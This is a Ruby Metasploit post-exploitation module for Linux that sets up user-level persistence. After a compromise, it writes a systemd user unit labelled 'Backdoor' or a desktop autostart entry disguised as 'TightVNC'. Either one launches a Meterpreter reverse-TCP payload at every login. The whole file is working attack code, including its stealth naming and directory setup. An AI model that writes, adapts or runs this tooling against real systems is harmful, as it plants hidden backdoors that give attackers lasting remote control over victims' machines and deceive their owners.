require 'msf/core'

class MetasploitModule < Msf::Exploit::Local
  Rank = NormalRanking

  include Msf::Post::Common
  include Msf::Post::File
  include Msf::Exploit::EXE

  def initialize
    super(
      'Name'		=> 'Linux regular user persistence',
      'Description'	=> %q{
        Linux persistence module that uses either Desktop Environment autostart or systemd user unit to launch payloads upon user login.

	If Python payload is used, it is written directly to the .desktop file which hopefully makes it a bit more stealthier.
      },
      'Author'		=> [ 'pyllyukko' ],
      'License'		=> MSF_LICENSE,
      'Platform'	=> [ 'linux', 'python', 'unix' ],
      'Targets'		=> [['Automatic', {}]],
      'Arch'		=> [ ARCH_PYTHON, ARCH_CMD ],
      'Privileged'	=> false,
      'DefaultTarget'	=> 0,
      # TODO: shell?
      'SessionTypes'	=> [ 'meterpreter' ],
      'DefaultOptions'	=>
        {
          'DisablePayloadHandler'	=> 'true',
	  'PAYLOAD'			=> 'python/meterpreter/reverse_tcp',
        },
      'References'	=>
        [
          [ 'URL', 'https://developer.gnome.org/autostart-spec/' ],
          [ 'URL', 'http://wiki.lxde.org/en/Autostart' ],
          [ 'URL', 'https://specifications.freedesktop.org/autostart-spec/0.5/ar01s02.html' ]
        ],
    )
    register_options([
      # TODO: binary payload path, systemd service & file names, autostart file name
      OptString.new('METHOD',
        [true, 'autostart || systemd',
         'autostart']
      ),
    ], self.class)
  end

  def exploit
    case datastore['METHOD']
      when 'systemd'
	systemd_method
      when 'autostart'
	autostart_method
    end
  end

  def check
    print_status("User: #{whoami}")
    case datastore['METHOD']
      when 'systemd'
	if exist?("/bin/systemctl")
	  return Exploit::CheckCode::Vulnerable
	else
	  print_error("/bin/systemctl does not exist. Maybe there is no systemd.")
	end
      when 'autostart'
	if desktop_environment.nil?
	  print_warning("Desktop environment not recognized")
	else
	  print_status("Desktop environment: #{desktop_environment}")
	end

	if exist?("/home/#{whoami}/.config")
	  return Exploit::CheckCode::Vulnerable
	end
    end
    Exploit::CheckCode::Safe
  end

  private

  def whoami
    cmd_exec("id -un").chomp
    #session.sys.config.getenv('USERNAME')
  end

  def desktop_environment
    session.sys.config.getenv('DESKTOP_SESSION')
  end

  def systemd_method
    if !exist?("/bin/systemctl")
      print_error("/bin/systemctl does not exist. Maybe there is no systemd.")
      return
    end
    if payload.arch.first != "python"
      print_error("Only Python payloads supported with systemd method as of yet")
      return
    end
    if !exist?("/home/#{whoami}/.config/systemd/user")
      print_status("Creating systemd user unit directory")
      cmd_exec("mkdir -p /home/#{whoami}/.config/systemd/user")
    end
    systemd_unit = <<-EOF
[Unit]
Description=Backdoor

[Service]
ExecStart=/usr/bin/python -c "#{payload.encoded}"
ExecStop=/bin/true
KillMode=none
Restart=no

[Install]
WantedBy=default.target
    EOF
    if write_file("/home/#{whoami}/.config/systemd/user/xinitrc.service", systemd_unit)
      print_good("Systemd unit written")
    end
    cmd_exec("systemctl --user daemon-reload")
    print_status("Enabling systemd user service")
    cmd_exec("systemctl --user enable xinitrc")
  end

  def autostart_method
    if !exist?("/home/#{whoami}/.config")
      print_error("/home/#{whoami}/.config directory does not exist. Maybe there is no desktop environment in use.")
      return
    end
    if !exist?("/home/#{whoami}/.config/autostart")
      print_status("Creating autostart directory")
      cmd_exec("mkdir -p /home/#{whoami}/.config/autostart")
    end

    print_status("Desktop Environment: #{desktop_environment}")

    desktopfile_path = "/home/#{whoami}/.config/autostart/evil.desktop"
    case payload.arch.first
      # this covers also generic/ payloads
      when 'x86'
	backdoor_path = "/tmp/payload.bin"
        if write_file(backdoor_path, generate_payload_exe)
          print_good("Payload written to #{backdoor_path}")
        end
	cmd_exec("chmod +x #{backdoor_path.shellescape}")
	desktopfile_content = <<-EOF
[Desktop Entry]
Type=Application
Name=TightVNC
Exec=#{backdoor_path}
StartupNotify=false
	EOF
      # If python payload -> write directly to the .desktop
      when 'python'
	payload = generate_payload
	desktopfile_content = <<-EOF
[Desktop Entry]
Type=Application
Name=TightVNC
Exec=python -c "#{payload.encoded}"
StartupNotify=false
	EOF
	# Check that Python exists
	if cmd_exec("which python") == ""
	  print_error("Python not found")
	  return
	end
      when 'cmd'
	payload = generate_payload
	desktopfile_content = <<-EOF
[Desktop Entry]
Type=Application
Name=TightVNC
Exec=sh -c '#{payload.encoded}'
StartupNotify=false
	EOF
    end
    if write_file(desktopfile_path, desktopfile_content)
      print_good("Autostart written to #{desktopfile_path}")
    end
  end

end
